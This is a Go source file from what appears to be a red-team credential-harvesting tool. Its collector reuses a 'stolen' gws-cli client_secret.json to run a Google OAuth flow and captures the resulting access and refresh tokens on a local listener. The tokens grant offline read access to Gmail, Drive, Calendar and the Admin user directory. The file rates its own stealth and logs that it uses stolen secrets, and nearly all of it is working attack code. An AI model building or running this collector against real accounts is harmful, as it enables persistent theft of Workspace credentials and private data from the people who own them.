package google

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/platform"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
	"github.com/ninken/ninloader-go/internal/validator"
)

const (
	gwsTokenEndpoint = "https://oauth2.googleapis.com/token"
	gwsOAuthAuthURL  = "https://accounts.google.com/o/oauth2/v2/auth"
)

// Default Workspace scopes — maps to Ninken services (Gmail, Drive, Calendar, Admin, Chat, GCP).
var gwsDefaultScopes = strings.Join([]string{
	"openid",
	"email",
	"profile",
	"https://www.googleapis.com/auth/gmail.readonly",
	"https://www.googleapis.com/auth/drive.readonly",
	"https://www.googleapis.com/auth/calendar.readonly",
	"https://www.googleapis.com/auth/admin.directory.user.readonly",
}, " ")

func init() {
	registry.Register("google", "gws_cli", func() collector.Collector {
		return &GwsCliCollector{
			BaseCollector: collector.BaseCollector{Svc: "google", Src: "gws_cli"},
		}
	})
}

// GwsCliCollector collects Google Workspace tokens via the gws-cli
// client_secret.json. It runs an interactive OAuth auth-code flow:
// opens a browser for user consent and captures the redirect on localhost.
//
// Stealth 3: interactive — requires the operator to click "Allow" in a browser.
type GwsCliCollector struct {
	collector.BaseCollector
	scopes       string
	clientSecret string
}

func (c *GwsCliCollector) Service() string          { return c.Svc }
func (c *GwsCliCollector) Source() string            { return c.Src }
func (c *GwsCliCollector) StealthScore() int         { return 3 }
func (c *GwsCliCollector) Platforms() []string       { return nil } // all platforms
func (c *GwsCliCollector) IsPlatformSupported() bool { return true }

// Configure accepts --scopes and --client-secret from the CLI.
func (c *GwsCliCollector) Configure(opts collector.CollectOptions) {
	if opts.Scopes != "" {
		c.scopes = opts.Scopes
	}
	if opts.ClientSecret != "" {
		c.clientSecret = opts.ClientSecret
	}
}

// ── helpers ──────────────────────────────────────────────────

// gwsDir returns ~/.config/gws.
func gwsDir() string {
	return filepath.Join(platform.HomeDir(), ".config", "gws")
}

// clientCredentials holds the parsed client_id + client_secret + optional token_uri.
type clientCredentials struct {
	ClientID     string
	ClientSecret string
	TokenURI     string
}

// readClientSecret reads and parses client_secret.json from the resolved path.
// Path resolution: env GOOGLE_CLIENT_SECRET_PATH > explicit flag > default.
func readClientSecret(overridePath string) *clientCredentials {
	path := filepath.Join(gwsDir(), "client_secret.json")

	if envPath := os.Getenv("GOOGLE_CLIENT_SECRET_PATH"); envPath != "" {
		path = envPath
	}
	if overridePath != "" {
		path = overridePath
	}

	raw, err := os.ReadFile(path)
	if err != nil {
		return nil
	}

	var data struct {
		Installed struct {
			ClientID     string `json:"client_id"`
			ClientSecret string `json:"client_secret"`
			TokenURI     string `json:"token_uri"`
		} `json:"installed"`
	}
	if err := json.Unmarshal(raw, &data); err != nil {
		return nil
	}
	if data.Installed.ClientID == "" || data.Installed.ClientSecret == "" {
		return nil
	}

	return &clientCredentials{
		ClientID:     data.Installed.ClientID,
		ClientSecret: data.Installed.ClientSecret,
		TokenURI:     data.Installed.TokenURI,
	}
}

// clientSecretPath returns the resolved path to client_secret.json (for discovery hints).
func clientSecretPath(overridePath string) string {
	if envPath := os.Getenv("GOOGLE_CLIENT_SECRET_PATH"); envPath != "" {
		return envPath
	}
	if overridePath != "" {
		return overridePath
	}
	return filepath.Join(gwsDir(), "client_secret.json")
}

// ── Discover ─────────────────────────────────────────────────

func (c *GwsCliCollector) Discover() []*types.DiscoveredToken {
	client := readClientSecret(c.clientSecret)
	if client == nil {
		return nil
	}

	hint := client.ClientID
	if len(hint) > 25 {
		hint = hint[:25] + "..."
	}

	return []*types.DiscoveredToken{{
		Service:      c.Svc,
		Source:       c.Src,
		Path:         clientSecretPath(c.clientSecret),
		AccountHint:  fmt.Sprintf("client_id=%s", hint),
		StealthScore: c.StealthScore(),
		Details:      "GWS auth-code flow — Workspace scopes (Gmail/Drive/Calendar/Admin)",
	}}
}

// ── Collect ──────────────────────────────────────────────────

func (c *GwsCliCollector) Collect() []*types.CollectedToken {
	client := readClientSecret(c.clientSecret)
	if client == nil {
		c.Warn("~/.config/gws/client_secret.json not found or invalid")
		return nil
	}

	c.Info("Starting OAuth flow with stolen gws-cli client_secret.json...")

	// 1. Bind a random port for the redirect capture server.
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		c.Warn(fmt.Sprintf("Failed to bind capture port: %v", err))
		return nil
	}
	port := ln.Addr().(*net.TCPAddr).Port
	redirectURI := fmt.Sprintf("http://localhost:%d", port)

	// 2. Set up the capture server.
	var (
		authCode string
		mu       sync.Mutex
		done     = make(chan struct{})
	)

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		q := r.URL.Query()

		mu.Lock()
		defer mu.Unlock()

		if code := q.Get("code"); code != "" {
			authCode = code
			w.Header().Set("Content-Type", "text/html")
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write([]byte("<h2>NinLoader: GWS token captured! Close this tab.</h2>"))
			close(done)
			return
		}

		if errParam := q.Get("error"); errParam != "" {
			authCode = "ERROR:" + errParam
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write([]byte("OAuth error"))
			close(done)
			return
		}

		w.WriteHeader(http.StatusOK)
	})

	srv := &http.Server{Handler: mux}

	go func() {
		_ = srv.Serve(ln)
	}()

	// 3. Build OAuth URL.
	scope := c.scopes
	if scope == "" {
		scope = gwsDefaultScopes
	}

	tokenURI := gwsTokenEndpoint
	if client.TokenURI != "" {
		tokenURI = client.TokenURI
	}

	params := url.Values{
		"client_id":     {client.ClientID},
		"redirect_uri":  {redirectURI},
		"response_type": {"code"},
		"scope":         {scope},
		"access_type":   {"offline"},
		"prompt":        {"consent"},
	}
	oauthURL := gwsOAuthAuthURL + "?" + params.Encode()

	// 4. Open browser.
	c.Info("Opening browser for OAuth consent...")
	c.Info("Select your Google account and click Continue -> Allow")
	openBrowser(oauthURL)

	// 5. Wait for redirect (max 3 minutes).
	c.Info(fmt.Sprintf("Waiting for redirect on port %d...", port))

	select {
	case <-done:
		// Got it.
	case <-time.After(180 * time.Second):
		c.Warn("Timeout — no OAuth redirect received (3 min)")
		_ = srv.Shutdown(context.Background())
		return nil
	}
	_ = srv.Shutdown(context.Background())

	mu.Lock()
	code := authCode
	mu.Unlock()

	if code == "" {
		c.Warn("No auth code received")
		return nil
	}
	if strings.HasPrefix(code, "ERROR:") {
		c.Warn(fmt.Sprintf("OAuth error: %s", code))
		return nil
	}

	// 6. Exchange auth code for tokens.
	c.Info("Auth code captured! Exchanging for tokens...")
	tokenData, err := exchangeCode(code, client, redirectURI, tokenURI)
	if err != nil {
		c.Warn(fmt.Sprintf("Token exchange failed: %v", err))
		return nil
	}

	// 7. Decode email from id_token JWT.
	var email string
	if idToken, ok := tokenData["id_token"].(string); ok && idToken != "" {
		if payload := validator.DecodeJWTPayload(idToken); payload != nil {
			if e, ok := payload["email"].(string); ok {
				email = e
			}
		}
	}

	// 8. Build CollectedToken.
	accessToken, _ := tokenData["access_token"].(string)
	refreshToken, _ := tokenData["refresh_token"].(string)
	scopeStr, _ := tokenData["scope"].(string)

	tok := types.NewCollectedToken(c.Svc, c.Src, c.StealthScore())
	tok.AccountID = email
	tok.Username = email
	tok.AccessToken = types.Secure(accessToken)
	tok.RefreshToken = types.Secure(refreshToken)
	tok.ClientID = client.ClientID
	tok.ClientSecret = types.Secure(client.ClientSecret)
	tok.TokenURI = tokenURI
	tok.Scopes = strings.Fields(scopeStr)
	tok.Extra["grant_type"] = "authorization_code"
	tok.Extra["gws_cli"] = true

	c.Info(fmt.Sprintf("SUCCESS — GWS token for %s", orUnknown(email)))
	return []*types.CollectedToken{tok}
}

// ── Shared helpers ───────────────────────────────────────────

// exchangeCode exchanges an authorization code for tokens at the given endpoint.
func exchangeCode(code string, client *clientCredentials, redirectURI, tokenURI string) (map[string]any, error) {
	data := url.Values{
		"code":          {code},
		"client_id":     {client.ClientID},
		"client_secret": {client.ClientSecret},
		"redirect_uri":  {redirectURI},
		"grant_type":    {"authorization_code"},
	}

	resp, err := http.Post(tokenURI, "application/x-www-form-urlencoded", strings.NewReader(data.Encode()))
	if err != nil {
		return nil, fmt.Errorf("POST token endpoint: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(body[:min(len(body), 200)]))
	}

	var result map[string]any
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, fmt.Errorf("parse response: %w", err)
	}
	return result, nil
}

// openBrowser opens a URL in the default browser.
func openBrowser(url string) {
	switch runtime.GOOS {
	case "darwin":
		_ = exec.Command("open", url).Start()
	case "linux":
		_ = exec.Command("xdg-open", url).Start()
	case "windows":
		_ = exec.Command("cmd", "/c", "start", "", url).Start()
	}
}

// orUnknown returns s if non-empty, else "unknown".
func orUnknown(s string) string {
	if s == "" {
		return "unknown"
	}
	return s
}
